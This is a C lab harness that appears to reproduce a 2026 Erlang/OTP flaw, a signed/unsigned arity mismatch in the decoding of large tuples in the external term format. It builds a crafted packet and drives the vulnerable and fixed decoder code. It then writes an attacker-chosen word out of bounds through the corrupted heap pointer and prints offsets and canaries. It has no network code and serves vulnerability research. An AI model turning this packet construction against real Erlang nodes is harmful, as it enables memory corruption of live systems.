/*
 * CVE-2026-55737 / GHSA-446w-268v-9462 — direct-call lab model of the
 * Erlang OTP erts LARGE_TUPLE_EXT signed/unsigned arity mismatch.
 *
 * The decoded_size() and dec_term() LARGE_TUPLE_EXT statements below are
 * NOT rewrites: run.sh extracts them verbatim from the SHA-256-pinned
 * external.c snapshots at c5210b42^ (vulnerable) and c5210b42 (fixed)
 * and includes them under #line. Only the surrounding scaffolding
 * (types, macros, end-of-function factory->hp commit) is modelled.
 *
 * Modelled deliberately:
 *   - decoded_size() CHKSIZE() uses a 64-bit "post-inflation logical
 *     length" instead of endp-ep. The advisory notes the compressed-ETF
 *     envelope supplies this padding; forming a >2GiB C pointer would
 *     itself be UB. No large allocation is made.
 *   - the OOB write is the *subsequent* heap write through the corrupted
 *     factory->hp (external.c:5211 commits hp). We model that consumer
 *     write with an attacker-chosen Eterm word. This is a direct-call
 *     harness, not a BEAM build: no VM, no allocator, no network.
 *
 * No listener, no external contact. gcc 13 / clang, -O0 -g.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

typedef unsigned char byte;
typedef uintptr_t Eterm;         /* one 64-bit heap word */
typedef uint32_t Uint;
typedef uint32_t Uint32;
typedef int32_t Sint32;
typedef int64_t Sint;            /* Sint is a signed machine word on ARCH_64 */
typedef int64_t SWord;

typedef struct { Eterm *hp; Eterm *hp_end; } ErtsHeapFactory;
struct B2TContext_t {
    int state;
    struct { struct { int remaining_n; } dc; } u;
};
typedef struct B2TContext_t B2TContext;

/* Values pinned from external.h / erl_term.h at c5210b42^. */
#define LARGE_TUPLE_EXT        'i'
#define SMALL_TUPLE_EXT        'h'
#define ERTS_MAX_TUPLE_SIZE    (((Uint)1 << 24) - 1)   /* MAX_ARITYVAL */
#define B2TDecodeTuple         1
#define ERTS_GLOBAL_LIT_EMPTY_TUPLE  ((Eterm)0x3)
#define ASSERT(x)              ((void)0)              /* release build */

#define make_tuple(hp)         ((Eterm)(uintptr_t)(hp) | 0x2)
#define make_arityval(sz)      ((Eterm)(Uint)(sz))
#define get_uint32(p)          ((Uint)(((Uint)(p)[0] << 24) | \
                                       ((Uint)(p)[1] << 16) | \
                                       ((Uint)(p)[2] << 8)  | \
                                        (Uint)(p)[3]))
#define get_int32(p)           ((int)(int32_t)get_uint32(p))
#define get_int8(p)            ((int)(int8_t)(p)[0])

/* --- decoded_size() scaffolding ------------------------------------------ */
static const byte *g_etf_packet;
static uint64_t g_etf_logical_len;

#define CHKSIZE(sz) do { \
    if ((uint64_t)(sz) > g_etf_logical_len - \
                         (uint64_t)(ep - g_etf_packet)) goto error; \
} while (0)
#define ADDTERMS(n) do { \
    Uint32 before_terms = terms; \
    terms += (n); \
    if (terms < before_terms) goto error; \
} while (0)

static Sint decoded_size_model(const byte *packet, uint64_t logical_len)
{
    const byte *ep = packet;
    const byte *endp = packet;          /* kept: verbatim slice names it */
    Uint n;
    Sint heap_size = 0;
    Uint32 terms = 1;
    int atom_extra_skip = 0;
    SWord reds = 0;
    B2TContext *ctx = NULL;
    int tag;
    (void)endp; (void)atom_extra_skip; (void)reds; (void)ctx;

    g_etf_packet = packet;
    g_etf_logical_len = logical_len;
    tag = *ep++;
    switch (tag) {
#ifdef FIXED_VARIANT
#include "fixed/decoded_size_case.inc"
#else
#include "vuln/decoded_size_case.inc"
#endif
    default:
        goto error;
    }
    return heap_size;
error:
    return -1;
}

/* --- dec_term() scaffolding ---------------------------------------------- */
static const byte *dec_term_model(const byte *ep, Eterm *objp, Eterm *hp,
                                  Eterm *next, B2TContext *ctx,
                                  ErtsHeapFactory *factory)
{
    int n;
    SWord reds = 0;
    int tag = *ep++;
    (void)reds;
    switch (tag) {
#ifdef FIXED_VARIANT
#include "fixed/dec_term_case.inc"
#else
#include "vuln/dec_term_case.inc"
#endif
    default:
        goto error;
    }
    factory->hp = hp;      /* verbatim external.c:5211: factory->hp = hp; */
    return ep;
error:
    return NULL;
}

/* The next heap object a caller allocates through the corrupted hp. */
static void model_consumer_write(ErtsHeapFactory *factory, Eterm value)
{
    *factory->hp = value;
    factory->hp++;
}

static uint64_t parse_hex64(const char *s)
{
    uint64_t v = 0;
    if (strncmp(s, "0x", 2) == 0) s += 2;
    while (*s) {
        unsigned d;
        if (*s >= '0' && *s <= '9') d = (unsigned)(*s - '0');
        else if (*s >= 'a' && *s <= 'f') d = (unsigned)(*s - 'a') + 10;
        else if (*s >= 'A' && *s <= 'F') d = (unsigned)(*s - 'A') + 10;
        else return 0;
        v = (v << 4) | d;
        s++;
    }
    return v;
}

static void print_word_bytes(const char *label, const unsigned char *p)
{
    int i;
    printf("%s=", label);
    for (i = 0; i < 8; i++) printf("%02x", p[i]);
    printf("\n");
}

int main(int argc, char **argv)
{
    const char *scenario;
    uint32_t wire;
    uint64_t value;
    byte packet[16];
    uint64_t logical_len;
    Sint dsz;
    int n_signed;
    long delta_words;
    size_t arena_sz = 65536;
    const size_t heap_word = 4096;      /* deterministic arena layout */
    unsigned char *arena = NULL;
    Eterm *heap = NULL;
    ErtsHeapFactory factory;
    Eterm *before_target;
    Eterm readback = 0;
    B2TContext *ctx = NULL;
    Eterm out_slot = 0, next_slot = 0;

    if (argc < 4) {
        fprintf(stderr, "usage: driver SCENARIO ARITY_HEX VALUE_HEX\n");
        return 2;
    }
    scenario = argv[1];
    wire = (uint32_t)parse_hex64(argv[2]);
    value = parse_hex64(argv[3]);
    n_signed = (int)(int32_t)wire;
    delta_words = (long)n_signed + 1;   /* *hp++ consumes one word first */

    packet[0] = LARGE_TUPLE_EXT;
    packet[1] = (byte)(wire >> 24);
    packet[2] = (byte)(wire >> 16);
    packet[3] = (byte)(wire >> 8);
    packet[4] = (byte)wire;
    packet[5] = SMALL_TUPLE_EXT;        /* trailing element slot */
    packet[6] = 0x2a;
    logical_len = 5ULL + (uint64_t)wire + 1ULL;

    printf("SCENARIO=%s ARITY=0x%08x UINT=%u SIGNED=%d\n",
           scenario, wire, wire, n_signed);
    printf("DELTA_WORDS=%ld DELTA_BYTES=%ld\n",
           delta_words, delta_words * (long)sizeof(Eterm));
    printf("HP_PLUS_N_BYTES=%ld\n", (long)n_signed * (long)sizeof(Eterm));
    fflush(stdout);

    if (strcmp(scenario, "arith") == 0) {
        /* Exact advisory wire value, arithmetic only, no dereference. */
        dsz = decoded_size_model(packet, logical_len);
        printf("DECODED_SIZE_RC=%ld\n", (long)dsz);
        printf("LOGICAL_LEN=%llu\n", (unsigned long long)logical_len);
        return 0;
    }

    if (strcmp(scenario, "plain") == 0) {
        arena = (unsigned char *)mmap(NULL, arena_sz, PROT_READ | PROT_WRITE,
                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (arena == MAP_FAILED) return 3;
        memset(arena, 0xEE, arena_sz);
        heap = (Eterm *)(arena + heap_word * sizeof(Eterm));
    } else if (strcmp(scenario, "asan") == 0) {
        heap = (Eterm *)calloc(8, sizeof(Eterm));
        if (!heap) return 3;
    } else {
        fprintf(stderr, "unknown scenario %s\n", scenario);
        return 2;
    }

    dsz = decoded_size_model(packet, logical_len);
    printf("DECODED_SIZE_RC=%ld\n", (long)dsz);
    fflush(stdout);
    if (dsz < 0) {
        printf("WRITE_SKIPPED=1\n");
        if (arena) munmap(arena, arena_sz); else free(heap);
        return 0;
    }

    factory.hp = heap;
    factory.hp_end = heap + 8;
    dec_term_model(packet, &out_slot, heap, &next_slot, ctx, &factory);
    printf("HP_NEW_OFFSET_WORDS=%ld\n",
           (long)(factory.hp - heap));
    fflush(stdout);

    before_target = factory.hp;
    if (arena) {
        long off = (long)((unsigned char *)before_target - arena);
        printf("WRITE_OFF_BYTES=%ld\n", off);
        print_word_bytes("PRE", (const unsigned char *)before_target);
    }
    fflush(stdout);

    model_consumer_write(&factory, (Eterm)value);

    readback = *before_target;
    printf("READBACK=%016llx\n", (unsigned long long)readback);
    if (arena) {
        print_word_bytes("POST", (const unsigned char *)before_target);
        print_word_bytes("CANARY_MINUS2",
                         (const unsigned char *)(heap - 2));
    }
    fflush(stdout);
    if (arena) munmap(arena, arena_sz); else free(heap);
    return 0;
}
